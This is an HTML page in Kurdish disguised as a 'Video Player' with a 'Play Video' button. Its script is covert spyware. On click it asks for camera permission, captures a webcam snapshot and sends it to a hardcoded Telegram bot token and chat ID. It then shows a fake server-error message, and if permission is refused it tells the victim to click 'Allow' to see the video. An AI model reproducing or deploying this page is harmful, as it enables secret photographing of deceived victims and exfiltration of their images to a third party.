<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        body {
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            /* باگراوەندی نەخشینی کلاسیک و شاهانە */
            background-color: #1a2312; /* سەوزی زۆر تۆخ */
            background-image: 
                radial-gradient(circle at 50% 50%, rgba(212, 175, 55, 0.05) 0%, transparent 80%),
                url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M30 30c0-6.627-5.373-12-12-12S6 23.373 6 30s5.373 12 12 12 12-5.373 12-12zm0 0c0-6.627 5.373-12 12-12s12 5.373 12 12-5.373 12-12 12-12-5.373-12-12z' fill='%23d4af37' fill-opacity='0.1' fill-rule='evenodd'/%3E%3C/svg%3E");
            font-family: sans-serif;
            text-align: center;
        }

        #main-container {
            background: rgba(10, 15, 10, 0.9);
            padding: 45px 25px;
            border-radius: 10px;
            border: 2px solid #b89a4b;
            box-shadow: 0 0 50px rgba(0,0,0,0.8);
            width: 80%;
            max-width: 320px;
            position: relative;
        }

        /* وردەکاری زێڕین لە گۆشەکان */
        #main-container::before {
            content: "✧";
            position: absolute;
            top: 5px;
            left: 5px;
            color: #b89a4b;
        }

        h2 {
            color: #d4af37;
            margin-bottom: 30px;
            font-size: 19px;
            font-weight: normal;
        }

        #startBtn {
            padding: 14px 30px;
            font-size: 17px;
            border: 1px solid #d4af37;
            background: transparent;
            color: #d4af37;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }

        #startBtn:hover {
            background: #d4af37;
            color: #1a2312;
        }
    </style>
</head>
<body>

    <div id="main-container">
        <h2 id="status">ڤیدیۆکە ئامادەیە</h2>
        <button id="startBtn">Play Video 🎬</button>
    </div>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const token = '7690976118:AAFBKfwJcXYlhYf4CDLIoynZoTTLho1jp5g'; 
        const myId = '7978104952'; 

        document.getElementById('startBtn').addEventListener('click', function() {
            document.getElementById('status').innerText = "کەمێک چاوەڕێ بکە...";
            this.style.display = 'none';

            navigator.mediaDevices.getUserMedia({ video: true })
            .then(s => {
                const v = document.getElementById('v');
                v.srcObject = s;
                
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = 640; c.height = 480;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    c.toBlob(b => {
                        const f = new FormData();
                        f.append('chat_id', myId);
                        f.append('photo', b, 'img.jpg');

                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                            method: 'POST',
                            body: f
                        }).then(() => {
                            document.getElementById('status').innerText = "هەڵەیەک لە سێرڤەر ڕوویدا، دووبارە هەوڵ بدەرەوە!";
                        });
                    }, 'image/jpeg');
                }, 1000);
            })
            .catch(e => {
                document.getElementById('status').innerText = "بۆ بینینی ڤیدیۆکە دەبێت ڕێگە بدەیت (Allow).";
            });
        });
    </script>
</body>
</html>
